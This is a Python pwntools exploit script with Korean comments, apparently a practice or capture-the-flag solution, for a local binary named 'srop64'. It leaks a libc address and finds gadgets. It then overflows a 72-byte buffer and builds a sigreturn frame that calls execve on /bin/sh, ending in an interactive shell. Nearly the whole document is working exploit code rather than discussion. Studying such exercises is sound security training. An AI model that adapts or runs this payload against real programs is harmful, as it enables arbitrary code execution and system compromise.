from pwn import *

p = process('./srop64')
libc = ELF('/usr/lib/libc.so.6')

rop = ROP(libc)

context.terminal = ['tmux', 'splitw', '-h']

def slog(n, a): return success(': '.join([n, hex(a)]))

p.recvuntil(b'Printf() address : ')
printf = int(p.recvline()[:-1], 16)
lb = printf - libc.sym['printf']
binsh = lb + next(libc.search(b'/bin/sh\x00'))
syscall = lb + rop.find_gadget(['syscall', 'ret'])[0]
pop_rax = lb + rop.find_gadget(['pop rax', 'ret'])[0]

pay = b'A'*0x48 # 72
pay += p64(pop_rax) + p64(0xf) # sigreturn syscall num
pay += p64(syscall)# 수동으로 syscall; ret 체인 하나인 것처럼 만들기;;; 이게아닌가; < 안됨

# 32비트와 다르게 여긴 sigcontext까지의 거리가 또 다름
# ucontext안에 sigcontext가 있다고 보면 됨
'''
struct ucontext_x32 {
	unsigned int	  uc_flags;
	unsigned int 	  uc_link;
	compat_stack_t	  uc_stack;
	unsigned int	  uc__pad0;     /* needed for alignment */
	struct sigcontext uc_mcontext;  /* the 64-bit sigcontext type */
	compat_sigset_t	  uc_sigmask;	/* mask last for extensibility */
};
'''

# 따라서, 더미를 넣어줘야함.
# 근데 sigreturnFrame 쓰면 알아서 해준다~~

frame = SigreturnFrame(arch='amd64')
frame.rax = 59 # rax, syscall
frame.rdi = binsh # binsh
frame.rsp = syscall # sigreturn's ret addr
frame.rip = syscall # ip

pay += bytes(frame)

gdb.attach(p, '''
b *vuln+85
c
''')

p.send(pay)

pause()
p.interactive()
